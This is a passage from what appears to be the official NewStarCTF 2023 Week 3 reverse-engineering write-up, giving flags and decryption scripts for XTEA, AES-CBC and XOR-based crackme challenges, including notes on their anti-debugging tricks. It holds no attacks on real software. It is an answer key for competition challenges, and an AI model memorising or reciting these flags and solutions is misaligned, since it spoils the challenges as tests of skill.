ql-global="true" line="HXxW" style="line-height: 2.0;" linespacing="115" class="bullet-item"><strong>FLAG</strong>：flag{Ca1l_y0u_3ven_1f_w3_@r3_f@r_Apart!}</li></ul><ul data-list-style="circle"><li ql-global="true" line="ycsO" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="xXu4"><br></p><p ql-global="true" line="WOGF">在TLS中加入了反调试，以及修改了XTEA用到的key</p><p ql-global="true" line="nBmB"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="761" height="auto" ori-width="761" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(2).png" ori-height="304" data-src="https://uploader.shimo.im/f/oyGwEGgnurrGPUbW.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="paUM"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="793" height="auto" ori-width="793" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(3).png" ori-height="285" data-src="https://uploader.shimo.im/f/274HSF9pNQkSr28Y.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="GRR8"><br></p><p ql-global="true" line="q9im">可以得到key的值为[5,20,13,14]</p><p ql-global="true" line="2WF2">在导出表中很快就能找到encrypt函数</p><p ql-global="true" line="033Z"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1037" height="auto" ori-width="1037" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(4).png" ori-height="533" data-src="https://uploader.shimo.im/f/LWmTVpTO20Rq3bLy.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="lPfW">小小魔改过的XTEA</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="x6P1" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">#include&lt;stdio.h&gt;</span></div><div line="kxkJ" data-language="python" class="ql-code-block ql-word-wrap-true">void encrypt(unsigned <span class="hljs-built_in">int</span>* v, unsigned <span class="hljs-built_in">int</span>* key)</div><div line="rgZX" data-language="python" class="ql-code-block ql-word-wrap-true">{</div><div line="D7VJ" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; unsigned <span class="hljs-built_in">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], <span class="hljs-built_in">sum</span> = <span class="hljs-number">1</span>, delta = <span class="hljs-number">999999999</span>;</div><div line="ZLao" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">33</span>; i++) {</div><div line="JISR" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; l += (((r &lt;&lt; <span class="hljs-number">3</span>) ^ (r &gt;&gt; <span class="hljs-number">4</span>)) + r) ^ (<span class="hljs-built_in">sum</span> + key[<span class="hljs-built_in">sum</span> &amp; <span class="hljs-number">3</span>]);</div><div line="Sw6W" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-built_in">sum</span> += delta;</div><div line="ognL" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; r += (((l &lt;&lt; <span class="hljs-number">3</span>) ^ (l &gt;&gt; <span class="hljs-number">4</span>)) + l) ^ (<span class="hljs-built_in">sum</span> + key[(<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);</div><div line="NXJw" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; }</div><div line="eVc8" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; v[<span class="hljs-number">0</span>] = l;</div><div line="mFD4" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; v[<span class="hljs-number">1</span>] = r;</div><div line="Zbj9" data-language="python" class="ql-code-block ql-word-wrap-true">}</div><div line="hDGH" data-language="python" class="ql-code-block ql-word-wrap-true">void decrypt(unsigned <span class="hljs-built_in">int</span>* v, unsigned <span class="hljs-built_in">int</span>* key) {</div><div line="BVNE" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; unsigned <span class="hljs-built_in">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span>, delta = <span class="hljs-number">999999999</span>;</div><div line="58Ix" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-built_in">sum</span> = <span class="hljs-number">1</span>+delta * <span class="hljs-number">33</span>;</div><div line="f9WD" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">33</span>; i++) {</div><div line="icRw" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; r -= (((l &lt;&lt; <span class="hljs-number">3</span>) ^ (l &gt;&gt; <span class="hljs-number">4</span>)) + l) ^ (<span class="hljs-built_in">sum</span> + key[(<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);</div><div line="jSPS" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-built_in">sum</span> -= delta;</div><div line="T9Bu" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; l -= (((r &lt;&lt; <span class="hljs-number">3</span>) ^ (r &gt;&gt; <span class="hljs-number">4</span>)) + r) ^ (<span class="hljs-built_in">sum</span> + key[<span class="hljs-built_in">sum</span> &amp; <span class="hljs-number">3</span>]);</div><div line="AuQc" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; }</div><div line="pM8a" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; v[<span class="hljs-number">0</span>] = l;</div><div line="XZxz" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; v[<span class="hljs-number">1</span>] = r;</div><div line="ECZj" data-language="python" class="ql-code-block ql-word-wrap-true">}</div><div line="hsML" data-language="python" class="ql-code-block ql-word-wrap-true">unsigned char a[<span class="hljs-number">41</span>] ={ &nbsp;<span class="hljs-number">130</span>,<span class="hljs-number">67</span>,<span class="hljs-number">163</span>,<span class="hljs-number">137</span>,<span class="hljs-number">111</span>,<span class="hljs-number">186</span>,<span class="hljs-number">128</span>,<span class="hljs-number">200</span>,<span class="hljs-number">248</span>,<span class="hljs-number">180</span>,<span class="hljs-number">86</span>,<span class="hljs-number">189</span>,<span class="hljs-number">179</span>,<span class="hljs-number">65</span>,<span class="hljs-number">178</span>,<span class="hljs-number">141</span>,<span class="hljs-number">218</span>,<span class="hljs-number">68</span>,<span class="hljs-number">14</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">46</span>,<span class="hljs-number">56</span>,<span class="hljs-number">222</span>,<span class="hljs-number">18</span>,<span class="hljs-number">84</span>,<span class="hljs-number">173</span>,<span class="hljs-number">137</span>,<span class="hljs-number">149</span>,<span class="hljs-number">48</span>,<span class="hljs-number">99</span>,<span class="hljs-number">33</span>,<span class="hljs-number">223</span>,<span class="hljs-number">13</span>,<span class="hljs-number">148</span>,<span class="hljs-number">17</span>,<span class="hljs-number">220</span>,<span class="hljs-number">178</span>,<span class="hljs-number">208</span>,<span class="hljs-number">17</span>};</div><div line="nSU5" data-language="python" class="ql-code-block ql-word-wrap-true">unsigned <span class="hljs-built_in">int</span> key[]={<span class="hljs-number">5</span>,<span class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>};</div><div line="9WJV" data-language="python" class="ql-code-block ql-word-wrap-true">signed main(){</div><div line="p8gz" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; unsigned <span class="hljs-built_in">int</span> *t=(unsigned <span class="hljs-built_in">int</span>*)a;</div><div line="jSjJ" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">9</span>;i+=<span class="hljs-number">2</span>){</div><div line="L1cQ" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; decrypt(t+i,key);</div><div line="g6YF" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; }</div><div line="nS24" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)</div><div line="F8mA" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; {</div><div line="Lxny" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; printf(<span class="hljs-string">"%c%c%c%c"</span>, *((char*)&amp;t[i] + <span class="hljs-number">0</span>), *((char*)&amp;t[i] + <span class="hljs-number">1</span>), *((char*)&amp;t[i] + <span class="hljs-number">2</span>), *((char*)&amp;t[i] + <span class="hljs-number">3</span>));</div><div line="LM7z" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; }</div><div line="wKxq" data-language="python" class="ql-code-block ql-word-wrap-true">}</div></div><p ql-global="true" line="TVjT"><br></p><h1><div ql-global="true" line="pmFP" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>STL</div></h1><ul data-list-style="circle"><li ql-global="true" line="CR3w" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">C++ STL</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="WthK" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{b53fc431-eb1f-89da-5bd5-2e1184728a5das}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="tfxg" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="pSmc">输入flag并进行长度校验</p><p ql-global="true" class="ql-align-center" line="b5g2"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="755" src="./NewStarCTF 2023 Week3 官方WriteUp_files/4102651815.png" ori-height="119" data-src="https://uploader.shimo.im/f/pkcCvNVGrKrmw72h.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="B5rF">字符串反转</p><p ql-global="true" class="ql-align-center" line="cetj"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="822" src="./NewStarCTF 2023 Week3 官方WriteUp_files/3713089740.png" ori-height="45" data-src="https://uploader.shimo.im/f/JPlKq2kLMHoEkLVX.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="sibI">每一个字符异或后一位</p><p ql-global="true" class="ql-align-center" line="bMoG"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="837" src="./NewStarCTF 2023 Week3 官方WriteUp_files/2349053344.png" ori-height="153" data-src="https://uploader.shimo.im/f/QXzwcQYkSFyskRMx.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="mmDR">转为int后(data&lt;&lt;15)^data，之后和密文进行比较</p><p ql-global="true" class="ql-align-center" line="JNJc"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="860" src="./NewStarCTF 2023 Week3 官方WriteUp_files/1962356967.png" ori-height="247" data-src="https://uploader.shimo.im/f/3mW3vxahw3povQed.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-left" line="OyZM">flag{b53fc431-eb1f-89da-5bd5-2e1184728a5das}</p><div class="ql-code-block-container" data-language="cpp" word-wrap="" spellcheck="false"><div line="oRpb" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</div><div line="bHwI" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-type">uint64_t</span> data[<span class="hljs-number">11</span>] = { <span class="hljs-number">0x2882d802120e</span>,<span class="hljs-number">0x28529a05954</span>,<span class="hljs-number">0x486088c03</span>,<span class="hljs-number">0xc0fb3b55754</span>,<span class="hljs-number">0xc2b9b7f8651</span>,<span class="hljs-number">0xae83fb054c</span>,<span class="hljs-number">0x29abf6ddcb15</span>,<span class="hljs-number">0x10e261fc807</span>,<span class="hljs-number">0x2a82fe86d707</span>,<span class="hljs-number">0xe0cb79a5706</span>,<span class="hljs-number">0x330560890d06</span> };</div><div line="i0gg" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-type">uint32_t</span> flag[<span class="hljs-number">11</span>] = { <span class="hljs-number">0</span> };</div><div line="hQfU" data-language="cpp" class="ql-code-block ql-word-wrap-true"><br></div><div line="PmZe" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; ++i) {</div><div line="xaSJ" data-language="cpp" class="ql-code-block ql-word-wrap-true">                flag[i] = (((data[i] ^ (data[i] &gt;&gt; <span class="hljs-number">15</span>)) &gt;&gt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xfffffffc</span>) | (data[i] &amp; <span class="hljs-number">0x3</span>);</div><div line="cykB" data-language="cpp" class="ql-code-block ql-word-wrap-true">        }</div><div line="i0Lu" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-type">char</span> <span class="hljs-keyword">final</span>[<span class="hljs-number">50</span>] = { <span class="hljs-number">0</span> };</div><div line="JQPk" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; ++i) {</div><div line="UCHF" data-language="cpp" class="ql-code-block ql-word-wrap-true">                <span class="hljs-keyword">final</span>[i] = (*((<span class="hljs-type">char</span>*)&amp;flag + i)) &amp; <span class="hljs-number">0xff</span>;</div><div line="j4tS" data-language="cpp" class="ql-code-block ql-word-wrap-true">        }</div><div line="9T6i" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">42</span>; i &gt;= <span class="hljs-number">0</span>; i--) {</div><div line="uE1n" data-language="cpp" class="ql-code-block ql-word-wrap-true">                <span class="hljs-keyword">final</span>[i] ^= <span class="hljs-keyword">final</span>[i + <span class="hljs-number">1</span>];</div><div line="LsQH" data-language="cpp" class="ql-code-block ql-word-wrap-true">        }</div><div line="lkmh" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">43</span>; i &gt;= <span class="hljs-number">0</span>; i--) {</div><div line="0dra" data-language="cpp" class="ql-code-block ql-word-wrap-true">                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, <span class="hljs-keyword">final</span>[i]);</div><div line="UDDq" data-language="cpp" class="ql-code-block ql-word-wrap-true">        }</div><div line="vb22" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</div><div line="MaRv" data-language="cpp" class="ql-code-block ql-word-wrap-true">}</div></div><h1><div ql-global="true" line="u1Pb" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Let's Go</div></h1><ul data-list-style="circle"><li ql-global="true" line="6xd3" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">GO AES+反调试</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="AsOP" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{It's_time_to_Go!!!Let's_Go}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="2bQ5" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="Y6yx">在go语言中，main_init函数早于main_main函数执行。这里根据调试状态来修改<code class="ql-inlinecode">IV</code>的值</p><p ql-global="true" class="ql-align-center" line="fR7A"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="621" src="./NewStarCTF 2023 Week3 官方WriteUp_files/4287184516.png" ori-height="159" data-src="https://uploader.shimo.im/f/4X2GcgTp9dXilHjt.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="TPHy">十六进制字符串进行hex Decode得到密文数据</p><p ql-global="true" class="ql-align-center" line="BtTS"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="899" src="./NewStarCTF 2023 Week3 官方WriteUp_files/223434213.png" ori-height="123" data-src="https://uploader.shimo.im/f/U0QzVBV6ihanPEka.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="tEXC">长度不为32则退出</p><p ql-global="true" class="ql-align-center" line="qEFS"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="679" src="./NewStarCTF 2023 Week3 官方WriteUp_files/2928641332.png" ori-height="128" data-src="https://uploader.shimo.im/f/XZR3VoKCwRkayBuc.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="MXkT">通过这两个函数可以得知程序对flag进行AES-CBC加密，所以接下来需要获取加密使用的key和iv</p><p ql-global="true" class="ql-align-center" line="4pjh"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="1273" src="./NewStarCTF 2023 Week3 官方WriteUp_files/3960651476.png" ori-height="544" data-src="https://uploader.shimo.im/f/x8rjdUcE2mAg7JOo.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="urYv">结合汇编得到key为NewStar!NewStar!</p><p ql-global="true" class="ql-align-center" line="I4M4"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="749" src="./NewStarCTF 2023 Week3 官方WriteUp_files/344051827.png" ori-height="116" data-src="https://uploader.shimo.im/f/Wjg3Wg059xEoVkPK.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="59qS">接下来获取iv，注意如果是调试状态iv不会被修改，也就是错误的iv</p><p ql-global="true" class="ql-align-center" line="FUow"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="793" src="./NewStarCTF 2023 Week3 官方WriteUp_files/2500202386.png" ori-height="163" data-src="https://uploader.shimo.im/f/uzgwGuThRpaT1mkR.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="1DjN">动调获取到iv后编写脚本</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="vDEe" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</div><div line="eFvP" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="4q61" data-language="python" class="ql-code-block ql-word-wrap-true">enc = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">"ee01674b13ff8dd86f8e481aa86f5d25e773a3fd0338f60988cb738b8b178c44"</span>)</div><div line="JnyS" data-language="python" class="ql-code-block ql-word-wrap-true">key = <span class="hljs-string">b"NewStar!NewStar!"</span></div><div line="MOqU" data-language="python" class="ql-code-block ql-word-wrap-true">iv = <span class="hljs-string">b"\x7C\x57\x45\x61\x46\x53\x40\x13\x7C\x57\x45\x61\x46\x53\x40\x13"</span></div><div line="9kxs" data-language="python" class="ql-code-block ql-word-wrap-true">aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)</div><div line="og8H" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(aes.decrypt(enc))</div></div><p ql-global="true" line="GXis">flag{It's_time_to_Go!!!Let's_Go}</p><h1><div ql-global="true" line="moKO" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>ez_chal</div></h1><ul data-list-style="circle"><li ql-global="true" line="Sgkn" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">魔改XTEA + ELF节区破坏</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="dkMO" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{Let's_Dr1nk_A_Cup_Of_Te4!!}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="8xdD" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="jQ7M">字符串和符号名都被混淆，通过start函数定位到主函数</p><p ql-global="true" class="ql-align-center" line="ggR3"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="953" src="./NewStarCTF 2023 Week3 官方WriteUp_files/2986187577.png" ori-height="310" data-src="https://uploader.shimo.im/f/0kUCcaDNms2cMuRX.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="CwtW">首先判断长度是否为32，之后把输入转为int型后传入加密函数</p><p ql-global="true" class="ql-align-center" line="Eigt"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="801" src="./NewStarCTF 2023 Week3 官方WriteUp_files/2146344390.png" ori-height="191" data-src="https://uploader.shimo.im/f/bbpoadYGRpZrSP3Y.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="MFMU">阅读加密函数代码可知为魔改xtea加密</p><p ql-global="true" class="ql-align-center" line="sAEB"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="1051" src="./NewStarCTF 2023 Week3 官方WriteUp_files/3718061177.png" ori-height="516" data-src="https://uploader.shimo.im/f/sQlOImFf1nHZAEpf.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="x4Wj">比对正常的xtea加密函数可知魔改部分，解密脚本如下</p><div class="ql-code-block-container" data-language="cpp" spellcheck="false"><div line="CeOZ" data-language="cpp" class="ql-code-block"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span></div><div line="3YB4" data-language="cpp" class="ql-code-block"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span></div><div line="9ky6" data-language="cpp" class="ql-code-block"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span></div><div line="GtWi" data-language="cpp" class="ql-code-block"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span></div><div line="ftkU" data-language="cpp" class="ql-code-block"><span class="hljs-function"><span class="hljs-type">void</span></span></div><div line="TKiy" data-language="cpp" class="ql-code-block"><span class="hljs-function"><span class="hljs-title">xtea_decipher</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span></div><div line="8d7u" data-language="cpp" class="ql-code-block"><span class="hljs-function"></span>{</div><div line="L1dj" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds = <span class="hljs-number">64</span>;</div><div line="KTqU" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;</div><div line="fc1J" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;<span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x9E3778B9</span>, sum = delta * num_rounds;</div><div line="BHBX" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++)</div><div line="VKIf" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;{</div><div line="FRMM" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp;v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]) ^ v0;</div><div line="HRwa" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp;sum -= delta;</div><div line="s7eD" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp;v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]) ^ v1;</div><div line="wl7W" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;}</div><div line="DDql" data-language="cpp" class="ql-code-block">&nbsp; &nbsp;v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;</div><div line="snXT" data-language="cpp" class="ql-code-block">}</div><div line="G8pr" data-language="cpp" class="ql-code-block"><br></div><div line="XaM2" data-language="cpp" class="ql-code-block"><span class="hljs-type">char</span> a[<span class="hljs-number">40</span>] = {<span class="hljs-number">0</span>};</div><div line="zHZN" data-language="cpp" class="ql-code-block"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</div><div line="zcE1" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-type">uint32_t</span> enc[<span class="hljs-number">8</span>] = { <span class="hljs-number">0xC19EA29C</span>,<span class="hljs-number">0xDC091F87</span>,<span class="hljs-number">0x91F6E33B</span>,<span class="hljs-number">0xF69A5C7A</span>,<span class="hljs-number">0x93529F20</span>,<span class="hljs-number">0x8A5B94E1</span>,<span class="hljs-number">0xF91D069B</span>,<span class="hljs-number">0x23B0E340</span>};</div><div line="fDsv" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">8</span>] = { <span class="hljs-number">0</span> };</div><div line="iORI" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-type">uint32_t</span> data[<span class="hljs-number">10</span>] = { <span class="hljs-number">0</span> };</div><div line="jdt6" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-built_in">memcpy</span>(a,<span class="hljs-string">"NewStar!NewStar!"</span>,<span class="hljs-built_in">strlen</span>(<span class="hljs-string">"NewStar!NewStar!"</span>));</div><div line="SfRz" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a); i+=<span class="hljs-number">4</span>) {</div><div line="ks7C" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; key[i / <span class="hljs-number">4</span>] = *(<span class="hljs-type">uint32_t</span>*)(a + i);</div><div line="iFzG" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; }</div><div line="Jq6q" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>) {</div><div line="t5rL" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-built_in">xtea_decipher</span>(&amp;enc[i], key);</div><div line="LIC2" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; }</div><div line="nkxP" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (<span 